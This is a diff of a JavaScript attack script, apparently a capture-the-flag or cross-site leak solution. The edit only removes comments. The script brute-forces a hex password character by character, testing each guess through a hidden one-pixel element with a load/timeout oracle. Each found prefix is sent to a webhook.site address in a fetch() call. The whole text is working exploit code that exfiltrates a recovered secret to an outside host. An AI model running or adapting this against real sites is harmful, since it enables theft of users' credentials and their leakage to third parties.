@@ -18,31 +18,25 @@
             const maxLength = 16;   // Set a maximum length to prevent infinite loop
 
             async function bruteForcePassword() {
-            // Outer loop: for each position in the password
             for (let pos = 0; pos < maxLength; pos++) {
                 let foundChar = null;
 
-                // Inner loop: try each possible character for the current position
                 for (const char of hexChars) {
                     const currentGuess = foundPassword + char;
                     console.log(`Trying: ${currentGuess}`);
 
-                    // Try the current guess and wait for the result
                     const result = await tryPassword(currentGuess);
 
                     if (result.status === 'success') {
-                        // If success, we found the correct character for this position
                         console.log(`✅ Found character ${pos+1}: ${char}`);
                         foundChar = char;
                         foundPassword = currentGuess; // Update the found password
                         fetch("https://webhook.site/ed3db625-aacb-48af-8ea1-7d72881fb7b1/?data=success&payload=" + currentGuess)
-                        break; // Break out of the inner loop and move to the next position
+                        break; 
                     }
-                    // If not success, continue to the next character
                     }
 
                     if (foundChar === null) {
-                    // If no character was found for this position, we might be done
                     console.log(`❌ No valid character found for position ${pos+1}. Assuming password is complete.`);
                     break;
                 }
@@ -62,11 +56,10 @@
                 obj.height = "1";
                 obj.style.visibility = "hidden";
 
-                // Set a timeout to clean up and resolve in case the request hangs
                 const timeoutId = setTimeout(() => {
                     resolve({ password, status: 'timeout' });
                     if (obj.parentNode) obj.remove();
-                }, 3000); // Adjust timeout as needed (e.g., 3000ms = 3 seconds)
+                }, 3000); 
 
                 obj.onload = () => {
                     clearTimeout(timeoutId);
